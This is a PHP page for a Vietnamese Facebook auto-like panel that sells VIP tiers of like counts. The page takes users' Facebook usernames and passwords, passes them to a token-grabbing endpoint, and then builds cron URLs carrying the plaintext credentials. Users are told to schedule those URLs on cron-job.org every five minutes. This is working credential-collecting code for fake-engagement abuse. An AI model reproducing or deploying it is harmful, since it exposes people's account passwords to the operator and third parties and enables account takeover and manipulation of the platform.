<?php
include'../head.php';
include'vip.php';
?>
<body>
<?php session_start(); ?>
<?php
include'config.php';
$_SESSION['idfb'] = $_POST['idfb'];
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
$idfb = $_SESSION['idfb'];
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
if(!$idfb || !$user || !$pass){
echo '<title>Thiếu Thông Tin Đăng Nhập</title>
<div class="alert alert-danger alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<strong>Spam!</strong> Xin Vui Lòng Hãy Nhập Đầy Đủ Thông Tin!
</div>';
}else{
$check = file_get_contents(''.$domain.'/token/htc.php?laytoken=ok&user='.urlencode($user).'&pass='.urlencode($pass).'');
$die = 'wrong_or_locked';
$unspec = 'unspecified_error';
if($check == $die){
echo '<title>Đăng Nhập Thất Bại</title>
<div class="alert alert-danger alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<strong>Error!</strong> Đăng Nhập Thất Bại!<br>Tài Khoản Hoặc Mật Khẩu Không Chính Xác Hoặc Nick Bị Checkpoint Hoặc Hãy Cài Đặt Ứng Dụng <b color="green">HTC Sense</b> <a href="http://botviet.net/gettoken/htc.php"><b color="black"><u>Tại Đây</u></b></a>
</div>';
}else if($check == $unspec || $check == ""){
echo '<title>Đăng Nhập Thất Bại</title>
<div class="alert alert-danger alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<strong>Error!</strong> Đăng Nhập Thất Bại!<br>Tài Khoản Hoặc Mật Khẩu Không Chính Xác Hoặc Nick Bị Checkpoint Hoặc Hãy Cài Đặt Ứng Dụng <b color="green">HTC Sense</b> <a href="http://botviet.net/gettoken/htc.php"><b color="black"><u>Tại Đây</u></b></a>
</div>';
}else {

if(in_array($idfb,$vip))
{
echo '

<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<strong>Chào Bạn</strong><b color="black"> Bạn Đang Là <b color="red">User Vip</b> Trên Hệ Thống</b>
</div>';
}else if(in_array($idfb,$vip4k)) {
echo '<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn là User Vip 4k nên số Like nhận được là <b color="black">4000 Like</b><br>Hãy <b color="red">Mua Vip</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}else if(in_array($idfb,$vip6k)){
echo '<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn Là User Vip 6k nên số Like nhận được là <b color="black">6000 Like</b><br>Hãy <b color="red">Mua Vip</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}else if(in_array($idfb,$vip8k)){
echo '<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn Là User Vip 8k nên số Like nhận được là <b color="black">8000 Like</b><br>Hãy <b color="red">Mua Vip</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}else if(in_array($idfb,$vip10k)){
echo '<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn Là User Vip 10k nên số Like nhận được là <b color="black">10000 Like</b><br>Hãy <b color="red">Mua Vip Unlimit</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}else if(in_array($idfb,$vip12k)){
echo '<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn Là User Vip 12k nên số Like nhận được là <b color="black">12000 Like</b><br>Hãy <b color="red">Mua Vip</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}else
{
echo '
<div class="alert alert-success alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
</strong>Chào Bạn!</strong> <b color="red">Bạn không phải User Vip nên số Like nhận được là <b color="black">5000 Like</b><br>Hãy <b color="red">Mua Vip</b> Để Nhận Nhận Nhiều Like Hơn Nhé!</b>
</div>';
}


echo '<center><img src="http://graph.facebook.com/'.$idfb.'/picture" alt="Lỗi ID User" class="img-circle" /><br /><b color="black">Người Dùng</b></center>';
echo '<title>Curl Like Panel</title>

<div class="panel panel-primary">
<div class="panel-heading">
<center><h4><b>Link Cron Của Bạn
</b></h4></center></div>
<div class="panel-body">
</div>
<div class="progress progress-striped active">
<div class="progress-bar"  role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 100%">
Hoàn Thành <span class="glyphicon glyphicon-ok"></span>
</div>
</div>
<div class="alert alert-warning alert-dismissable" role="alert">
<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<strong>Lưu ý:</strong> Bạn hãy cài cron cho các<b color="red"> địa chỉ trong khung dưới</b> tại trang <a href="http://cron-job.org"><b>http://cron-job.org</b></a>  chạy 5phút/lần nhé!
</div>

<div class="input-group">
<span class="input-group-addon"><span class="glyphicon glyphicon-globe"></span> Server 1</span>
<input type="text" class="form-control" value="'.$domain.'/chaylike.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'">
</div>
<center><div class="btn btn-success"><a href="'.$domain.'/chaylike.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'"><b color="blue">Kiểm Tra Sever 1</b></a></div></center>
<br>
<br>
<div class="input-group">
<span class="input-group-addon"><span class="glyphicon glyphicon-globe"></span> Server 2</span>
<input type="text" class="form-control" value="'.$domain.'/chaylike2.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'&chaylike=ok">
</div>
<center><div class="btn btn-success"><a href="'.$domain.'/chaylike2.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'&chaylike=ok"><b color="blue">Kiểm Tra Sever 2</b></a></center></div>
<br>
</div>
<br>';
}
}
?>
<?php
include'../foot.php';
?>
</body>